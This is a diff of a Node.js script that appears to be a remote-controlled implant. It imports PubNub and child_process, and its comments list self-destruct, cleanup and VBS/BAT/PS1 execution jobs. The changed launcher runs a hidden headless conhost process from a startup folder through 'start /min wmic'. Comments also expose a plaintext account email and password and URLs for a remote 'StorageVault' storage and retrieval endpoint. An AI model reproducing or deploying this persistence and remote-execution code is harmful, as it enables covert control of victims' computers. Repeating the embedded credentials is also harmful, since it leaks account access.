@@ -1,38 +1,22 @@
-debugger;
+// debugger;
+
 // https://github.com/gauravmehla/Javascript-bookshelf/blob/master/O'Reilly%20-%20You%20Don't%20Know%20JS.%20this%20%26%20Object%20Prototypes.pdf
 // https://www.tutorialspoint.com/compilers/online-nodejs-compiler.htm
+// https://onecompiler.com/nodejs#draft-yf7t
 
-// debugger;
+// https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/adminui
+//
+// https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/ping.php
+// https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/retrieve.php
+// 
 
 // https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce.com/
 // storagevault941@agentforce.com
 // As1df1gh!
 
-// 20260716-1824
-
-// https://onecompiler.com/nodejs#draft-yf7t
+// 20260731-1420
 
 // TODO
-
-const path = require("path");
-module.paths.push(
-    path.resolve(
-        __dirname,
-        "C:\\ProgramData\\owd\\node\\node-v26.4.0-win-x64\\node_modules"
-    )
-);
-
-const PubNub = require("pubnub");
-const net = require("net");
-const { fork, exec, spawn } = require("child_process");
-const fs = require("fs");
-const os = require("os");
-const crypto = require("crypto");
-const util = require("util");
-
-const ISDEBUG = false; // only used for time delay mod
-
-const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 // --- TESTING LIST ---
 // test vbs, bat, ps1 script job execution (EXEC_VBS, EXEC_BAT, EXEC_PS1 as well as execute_cmdlist method)
@@ -68,6 +52,27 @@ const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 //              InstallNode
 //              CleanUp
 //              SelfDestruct
+
+
+const path = require("path");
+module.paths.push(
+    path.resolve(
+        __dirname,
+        "C:\\ProgramData\\owd\\node\\node-v26.4.0-win-x64\\node_modules"
+    )
+);
+
+const PubNub = require("pubnub");
+const net = require("net");
+const { fork, exec, spawn } = require("child_process");
+const fs = require("fs");
+const os = require("os");
+const crypto = require("crypto");
+const util = require("util");
+
+const ISDEBUG = true;
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 var process_argv = [];
 
@@ -184,7 +189,8 @@ var startupfolderconfig = {
     },
 
     getLauncherScript(foldername) {
-        return `wmic process call create "conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} ${foldername}"`;
+        let pre = '@echo off' + '\r\n';
+        return pre + `start "" /min wmic process call create "conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} ${foldername}"`;
     },
 
     get foldernames() {
@@ -3819,7 +3825,7 @@ async function getTaskExists(taskname) {
     try {
         resultdict = await getTaskDetail(taskname);
     } catch (err) {
-        logmsg(err);
+        logmsg("task detail returned empty result -- assuming task does not exist");
         return false;
     }
 
